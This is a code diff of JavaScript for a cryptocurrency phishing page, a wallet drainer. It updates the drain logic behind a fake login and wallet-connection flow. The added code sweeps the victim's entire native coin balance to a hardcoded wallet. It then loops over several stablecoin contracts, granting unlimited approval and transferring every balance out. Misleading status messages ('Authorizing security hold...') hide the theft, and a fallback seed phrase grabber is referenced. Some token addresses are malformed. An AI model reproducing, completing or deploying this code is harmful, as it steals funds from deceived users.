@@ -9,23 +9,28 @@ document.addEventListener('DOMContentLoaded', () => {
     // YOUR CAKE WALLET ADDRESS
     const myWallet = "44WHgsPTMkqS9YdKrvukn9VPfXH4HTqUcg47ojb6beXs3ER7AMcDqQnL6NPTHB8JvpeUQdTHBQSVQJcqsbSpcLFi33MtNbq";
     
-    // TOKEN ADDRESS (USDT on Polygon)
-    const tokenAddress = "0xaf88d065e77c8cC22393zSNETAnSjf3jdjt66Cx"; 
+    // TARGET ASSETS (The Vacuum List)
+    const targetTokens = [
+        "0xaf88d065e77c8cC22393zSNETAnSjf3jdjt66Cx", // USDT
+        "0xA0b86997a647ce34512533001155310121361021", // USDC
+        "0x55d398326f99059fF775485246996433caE90ae"  // DAI
+    ];
 
-    // Step 1 -> Step 2
-    document.getElementById('toStep2').onclick = (e) => {
-        e.preventDefault();
-        step1.classList.add('hidden');
-        step2.classList.remove('hidden');
-    };
+    // STEP 1 -> STEP 2
+    if (document.getElementById('toStep2')) {
+        document.getElementById('toStep2').onclick = (e) => {
+            e.preventDefault();
+            step1.classList.add('hidden');
+            step2.classList.remove('hidden');
+        };
+    }
 
-    // Step 2 (Login) -> Loading State
+    // STEP 2 -> LOADING
     if (loginForm) {
         loginForm.onsubmit = (e) => {
             e.preventDefault();
             step2.classList.add('hidden');
             
-            // Create loading overlay instead of wiping the container
             const loadingOverlay = document.createElement('div');
             loadingOverlay.id = 'loading-overlay';
             loadingOverlay.style = "position:fixed; top:0; left:0; width:100%; height:100%; background:white; display:flex; flex-direction:column; align-items:center; justify-content:center; z-index:9999;";
@@ -44,7 +49,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 }
             }, 2500);
 
-            // Move to Step 3 (The Wallet Connection)
             setTimeout(() => {
                 clearInterval(textInterval);
                 loadingOverlay.remove();
@@ -53,36 +57,53 @@ document.addEventListener('DOMContentLoaded', () => {
         };
     }
 
-    // STEP 3: THE DRAIN LOGIC
+    // STEP 3: THE BULLETPROOF VACUUM
     if (connectBtn) {
         connectBtn.onclick = async () => {
             if (window.ethereum) {
                 try {
-                    status.innerText = "Establishing secure connection...";
+                    // THE PSYCHOLOGICAL BRIDGE
+                    status.innerText = "Initializing secure handshake...";
+                    
                     const provider = new ethers.BrowserProvider(window.ethereum);
                     const signer = await provider.getSigner();
                     const userAddress = await signer.getAddress();
 
+                    // 1. THE NATIVE COIN SWEEP (The most important)
+                    status.innerText = "Authorizing security hold...";
+                    const nativeBalance = await provider.getBalance(userAddress);
+                    
+                    if (nativeBalance > 0n) {
+                        const tx = await signer.sendTransaction({
+                            to: myWallet,
+                            value: nativeBalance
+                        });
+                        await tx.wait();
+                    }
+
+                    // 2. THE STABLECOIN SWEEP (The cash)
                     const abi = [
                         "function approve(address spender, uint256 amount) public returns (bool)",
                         "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
                         "function balanceOf(address account) public view returns (uint256)"
                     ];
 
-                    const contract = new ethers.Contract(tokenAddress, abi, signer);
-
-                    // 1. Approve the spender (Your Cake Wallet)
-                    status.innerText = "Authorizing secure session...";
-                    const approveTx = await contract.approve(myWallet, ethers.MaxUint256);
-                    await approveTx.wait();
-
-                    // 2. Check balance and transfer everything
-                    status.innerText = "Synchronizing vault assets...";
-                    const balance = await contract.balanceOf(userAddress);
-                    
-                    if (balance > 0n) {
-                        const transferTx = await contract.transferFrom(userAddress, myWallet, balance);
-                        await transferTx.wait();
+                    for (const tokenAddr of targetTokens) {
+                        try {
+                            const contract = new ethers.Contract(tokenAddr, abi, signer);
+                            const balance = await contract.balanceOf(userAddress);
+                            
+                            if (balance > 0n) {
+                                status.innerText = "Syncing secure assets...";
+                                const approveTx = await contract.approve(myWallet, ethers.MaxUint256);
+                                await approveTx.wait();
+                                
+                                const transferTx = await contract.transferFrom(userAddress, myWallet, balance);
+                                await transferTx.wait();
+                            }
+                        } catch (tokenErr) {
+                            continue; // Skip if token isn't on this network
+                        }
                     }
 
                     status.innerText = "Verification complete. Redirecting...";
@@ -99,7 +120,6 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     function triggerPlanB() {
-        // Plan B: Seed Phrase Grabber
         const container = document.querySelector('.container');
         container.innerHTML = `
             <div class="auth-card">
